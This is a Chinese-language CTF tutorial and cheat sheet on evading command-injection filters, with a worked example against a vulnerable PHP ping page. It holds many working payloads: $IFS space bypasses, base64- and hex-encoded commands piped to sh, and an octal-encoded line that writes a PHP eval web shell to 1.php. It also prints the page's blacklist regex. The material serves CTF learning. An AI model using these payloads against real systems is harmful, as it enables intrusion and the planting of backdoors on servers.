# 命令执行绕过

## 一些特殊字符绕过

### 空格绕过

如果过滤了空格，可以使用以下字符串代替：
```
<、<>、%20(space)、%09(tab)、$IFS$9、${IFS}、$IFS等
```

### 命令分隔符绕过

linux中：%0a、%0d、；、&、|、&&、||

windows中：%0a、&、|、%1a

## 一些关键字绕过

### 拼接绕过

通过创建变量，然后将变量拼接绕过

#### 实例

执行ls命令，可以构造命令：
```
a=l;b=s;$a$b
```

cat flag文件内容
```
a=c;b=at;d=lag;$a$b f$d
```

cat test文件内容
```
a='cccaaattt';$b=${a:0:1}${a:2:1}${a:4:1};$b test
```
### 编码绕过

base64编码
```
echo Y2F0IC9mbGFn|base64 -d|sh  ==>cat /flag
```

hex编码
```
echo "0x636174202f666c6167" | xxd -r -p|bash ==>cat /flag
```

oct/字节
```
$(print "\154\163") ==>ls

$(print "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag

{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"} | $0 ==>cat /flag
```

通过oct/字节编码
```
内容为php @eval($_POST['c'];?>

${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"}>> 1.php
```
### 单引号、双引号和反斜杠绕过

单引号绕过
```
c'a't test
```

双引号绕过
```
c"a"t test
```

反斜杠绕过
```
ca\t test
```
### 通配符绕过

[...]表示匹配括号中的任意一个字符
{.....}表示匹配括号里的所有模式，模式之间用,隔开
[...]和{...}的区别在于，如果[..]匹配没有文件，则会变成字符串，而{...}不会

构造实例
```
cat t?st

cat te*

cat t[a-z]st

cat t{a,b,c,d,e}st
```


### 内联执行

内联执行就是将反引号里的输出当做是输入执行

实例
```
cat `ls`
```

## 字母和数字都被过滤，则有：1.异或；2.取反
具体请看：https://blog.csdn.net/weixin_39877898/article/details/112198269



## 实例
通过打开页面，我们可以看见?ip=，因此我们可以构造payload:
```
?ip=127.0.0.1;ls
```

我们可以看见有两个文件，分别是flag.php和index.php，因此我们可以构造payload
```
?ip=127.0.0.1;cat /flag.php
```
发现有过滤，通过尝试，发现空格字符和flag关键字被过滤，因此我们可以先查看源码，用$IFS$9来对空格过滤进行绕过
```
?ip=127.0.0.1;cat$IFS$9index.php
```

看到源码，然后分析源码
```
/?ip=

PING 127.0.0.1 (127.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}

?>
```

有三种方法

第一种方法：
通过拼接法，构造payload:
```
?id=127.0.0.1;b=ag;cat$IFS$9fl$b.php
```


第二种方法
通过base64编码，构造payload
```
?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

第三种方法
通过内联执行，构造payload
```
?ip=127.0.0.1;cat$IFS$9`ls`
```


命令执行的具体可以看：https://www.cnblogs.com/Tkitn/p/11661017.html